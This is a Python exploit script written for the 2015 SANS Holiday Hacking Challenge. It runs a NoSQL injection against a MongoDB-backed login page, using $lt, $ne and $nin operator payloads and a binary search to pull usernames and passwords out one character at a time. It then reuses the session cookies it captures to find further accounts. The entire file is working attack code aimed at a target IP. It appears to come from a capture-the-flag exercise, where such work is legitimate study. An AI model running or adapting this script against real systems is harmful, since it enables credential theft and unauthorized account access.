#!/usr/bin/python
#
# Exploit Title: SANS Holiday Hacking Challenge GIYH SG03 NoSQLi Extract DB Creds
# Date: 12/2015
# Exploit Author: @deckerXL
# Version: 1.1
# Tested on: sg03
# Description: This will perform a NoSQLi attack using binary search queries to construct either users or passwords, character-by-character until each are enumerated using MongoDB database queries

import sys
import json
import urllib
import urllib2
import time

debug         = False
user          = ""
finalUserList = []
chars         = "!#$%&()*+-.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{|}~"

def usage():
	print "Usage:"
	print "./giyh-sg03-nosqli-pwndbcreds.py <ip> <port> <command> <parms> [-d]\n"
	print "<command>"
	print "  U = Enumerate MongoDB Users"
	print "     <parms> = none"
	print "  P = Find a specific user password"
	print "     <parms> = userid\n"
	print "Examples:"
	print "./giyh-sg03-nosqli-pwndbcreds.py 52.64.191.71 80 U"
	print "./giyh-sg03-nosqli-pwndbcreds.py 52.64.191.71 80 P admin\n"
	print "./giyh-sg03-nosqli-pwndbcreds.py 52.64.191.71 80 P louise\n"
	sys.exit(1)

def pmsg( str, code ):
        if ( code == 0 ):
                print "        [*] "+str      # Status message
        elif ( code == 1):
                print "        [+] "+str      # Success message
        elif ( code == 2):
                print "        [-] "+str      # Error message
        else:
                pass

def banner():
        print ""
        print "       =[ ----------------------------------------------- ]"
        print "+ -- --=[ GIYH SG03 NoSQLi Extract DB Creds               ]"
        print "       =[                                     by deckerXL ]"
        print "       =[ ----------------------------------------------- ]"
        print "                                                    __     "
        print "                                                 .-'  |    "
        print "                                                /   <\|    "
        print "                                               /     \'    "
        print "                                               |_.- o-o    "
        print "                                               / C  -._)\  "
        print "          ________.________.___. ___ ___      /',        | "
        print "         /  _____/|   \__  |   |/   |   \    |   `-,_,__,' "
        print "        /   \  ___|   |/   |   /    ~    \   (,,)====[_]=| "
        print "        \    \_\  \   |\____   \    Y    /     '.   ____/  "
        print "         \______  /___|/ ______|\___|_  /       | -|-|_    "
        print "                \/     \/             \/        |____)_)   "
        print ""


class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

opener = urllib2.build_opener(NoRedirectHandler())
urllib2.install_opener(opener)

# =============================================================
# Check input parameters
# =============================================================
if (len(sys.argv)< 4):
	usage();

ip = sys.argv[1][0:15]
try:
	port = int(sys.argv[2][0:5])
except:
	pmsg ("ERROR - Invalid Port: ["+sys.argv[2]+"]",2)
	usage()

banner()

command = sys.argv[3][0:1]
if (command == "P"):
	if (len(sys.argv) < 5):
		pmsg ("ERROR - Missing userid required with Command: ["+sys.argv[3]+"]",2)
		usage()
	else:
		user = sys.argv[4][0:50]
		pmsg ("Attempting to perform a PASSWORD ENUMERATION on user: ["+user+"]...",0)
elif (command == "U"):
		pmsg ("Attempting to perform a USER ENUMERATION...",0)
else:
	pmsg ("ERROR - Invalid Command: ["+sys.argv[3]+"]",2)
	usage()

if ("-d" in sys.argv):
	debug = True

if(command == "P"):
	nosqli_data = { "username": {"$eq": ""}, "password": {"$lt": ""} }
	nosqli_data["username"]["$eq"] = user
else:
	nosqli_data = { "username": {"$lt": ""}, "password": {"$ne": ""}}

url = "http://"+ip+":"+str(port)+"/"

# =============================================================
# Initial GET Request to get a valid sessionid
# =============================================================
pmsg ("Retrieving an initial valid sessionid from URL ["+url+"]...",0)
try:
	req_init = urllib2.Request(url)
	req_init.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
	res_init = urllib2.urlopen(req_init)
except:
	pmsg ("ERROR - Connecting to URL: ["+url+"]",2)
	sys.exit(1)
	
init_headers = res_init.info()
init_body = res_init.read()

if (debug):
	print "Init Headers & Body ------------------------------------------------------------"
	print init_headers
	print "--------------------------------------------------------------------------------"
	print "["+init_body+"]"
	print "--------------------------------------------------------------------------------"

sessionid = str(filter(lambda x: 'sessionid' in x, init_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got a valid sessionid: ["+sessionid+"]!",1)
res_init.close()

# =============================================================
# Loop character by character binary search for each letter of the password
# =============================================================
wrkchars = chars
build_str = ''
mid = 0
found = False
while (not found):

	mid = len(wrkchars)/2
	midchr = wrkchars[mid]
	
	if(command == "P"):
		nosqli_data["password"]["$lt"] = build_str+midchr
	else:
		nosqli_data["username"]["$lt"] = build_str+midchr
		
	if (debug):
		print "Wrkchars: ["+wrkchars+"]"
		print "Mid: ["+str(mid)+"]"
		print "Char: ["+midchr+"]"
		print "["+str(nosqli_data)+"]"

	req_nosqli = urllib2.Request(url)
	req_nosqli.add_header('Content-Type', 'application/json')
	req_nosqli.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
	req_nosqli.add_header('Cookie', 'sessionid='+sessionid)

	pmsg ("Binary Search: Sending request for character ["+midchr+"]...",0)

	res_nosqli = urllib2.urlopen(req_nosqli, json.dumps(nosqli_data))
	headers = res_nosqli.info()
	body = res_nosqli.read()
	res_nosqli.close()
	
	if (debug):
		print "NoSQLi Headers & Body ----------------------------------------------------------"
		print headers
		print "--------------------------------------------------------------------------------"
		print "["+body+"]"

		if (body == ""):
			print "Body is empty"
		print "--------------------------------------------------------------------------------"

	# =============================================================
	# If body is empty, then password is $lt "less than", so use lower half of the range
	# =============================================================
	if (body == ""):
		wrkchars=wrkchars[0:mid]	
	else:
		wrkchars=wrkchars[mid:len(wrkchars)]	
	
	# =============================================================
	# Once mid reaches 0, then we're down to the actual character in the password
	# =============================================================
	if (mid == 0):
		build_str = build_str+midchr
		wrkchars = chars
		if(command == "P"):
			pmsg ("---------------------------- For user: ["+user+"] password fragment confirmed so far is: ["+build_str+"]",1)
		else:
			pmsg ("---------------------------- User fragment confirmed so far is: ["+build_str+"]",1)

		if (build_str == "~~~"):
			pmsg ("EXITING: Chances are this host is not vulnerable to the NoSQL Injection Vulnerability",2)
			sys.exit(1)

		# =============================================================
		# Check if we got a valid password yet with an $eq check, or if we need to keep going
		# =============================================================
		pmsg ("Checking if this is the final password...",0)
		if(command == "P"):
			check_data = { "username": {"$eq": ""}, "password": {"$eq": ""} }
			check_data["username"]["$eq"] = user
			check_data["password"]["$eq"] = build_str
		else:
			check_data = { "username": {"$eq": ""}, "password": {"$gte": ""} }
			check_data["username"]["$eq"] = build_str

		req_check = urllib2.Request(url)
		req_check.add_header('Content-Type', 'application/json')
		req_check.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
		req_check.add_header('Cookie', 'sessionid='+sessionid)
		res_check = urllib2.urlopen(req_check, json.dumps(check_data))
		body_check = res_check.read()
		res_check.close()

		if (debug):
			print "Check Body ---------------------------------------------------------------------"
			print "["+body_check+"]"
			print "--------------------------------------------------------------------------------"

		if (body_check == ""):
			found = True
			if(command == "P"):
				pmsg ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! For user: ["+user+"] THE PASSWORD IS: ["+build_str+"]",1)
			else:
				pmsg ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Found valid database user ["+build_str+"]",1)
				finalUserList.append(build_str)

				i = 0
			 	all_users = False		
				users_nosqli_data = { "username": { "$nin": [ "" ]},"password": {"$ne": ""} }
				users_nosqli_data["username"]["$nin"][i] = build_str
				while (not all_users):

					pmsg ("Excluding found users to mine for new mystery users.",0)

					if (debug):
						print "Excluding the following found users to mine for new mystery users: "+str(users_nosqli_data["username"]["$nin"])+""
						print "User data string: ["+str(users_nosqli_data)+"]"

					pmsg ("Sending the first request to get a valid session as the new mystery user...",0)
					req_users_nosqli = urllib2.Request(url)
					req_users_nosqli.add_header('Content-Type', 'application/json')
					req_users_nosqli.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
					req_users_nosqli.add_header('Cookie', 'sessionid='+sessionid)
					res_users_nosqli = urllib2.urlopen(req_users_nosqli, json.dumps(users_nosqli_data))
					user_headers = res_users_nosqli.info()
					user_body = res_users_nosqli.read()
					res_users_nosqli.close()

					if (debug):
						print "NoSQLi User Headers & Body #1 --------------------------------------------------"
						print user_headers
						print "--------------------------------------------------------------------------------"
						print "["+user_body+"]"
						print "--------------------------------------------------------------------------------"

					try:
						new_sessionid = str(filter(lambda x: 'sessionid' in x, user_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
					except:
						all_users = True
						pmsg ("FINAL LIST OF DB USERS FOUND: "+str(finalUserList),1)
						pmsg ("ALL Users Found - Ending Run...",0)
					else:
						pmsg ("Got a new valid sessionid: ["+new_sessionid+"] as the mystery user",0)

						pmsg ("Sending the second request to get a valid signed-in home page as the new mystery user...",0)
						req_users_nosqli = urllib2.Request(url)
						req_users_nosqli.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
						req_users_nosqli.add_header('Cookie', 'sessionid='+new_sessionid)
						res_users_nosqli = urllib2.urlopen(req_users_nosqli)
						user_headers = res_users_nosqli.info()
						user_body = res_users_nosqli.read()
						res_users_nosqli.close()
	
						if (debug):
							print "NoSQLi User Headers & Body #2 --------------------------------------------------"
							print user_headers
							print "--------------------------------------------------------------------------------"
							print "["+user_body+"]"
							print "--------------------------------------------------------------------------------"
	
						index1 = user_body.index('Welcome ') + 8
						index2 = user_body.index(', to the GIYH Administrative Portal.')
	
						if (debug):
							print "--------------------------------------------------------------------------------"
							print "Index 1: ["+str(index1)+"]"
							print "Index 2: ["+str(index2)+"]"
							print "--------------------------------------------------------------------------------"
	
						build_str = user_body[index1:index2]
						pmsg ("Found user on page: ["+build_str+"]",0)
	
						if (len(build_str) > 0):
							pmsg ("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Found a subsequent valid database user ["+build_str+"]",1)
							i = i + 1
							users_nosqli_data["username"]["$nin"].insert(i, build_str)
							finalUserList.append(build_str)
						else:
							all_users = True
							pmsg ("FINAL LIST OF DB USERS FOUND: "+str(finalUserList),1)
							pmsg ("ALL Users Found - Ending Run...",0)

		else:
			pmsg ("NOT the final password, keep checking for more characters...",0)

		# time.sleep(2)
		
sys.exit(0)
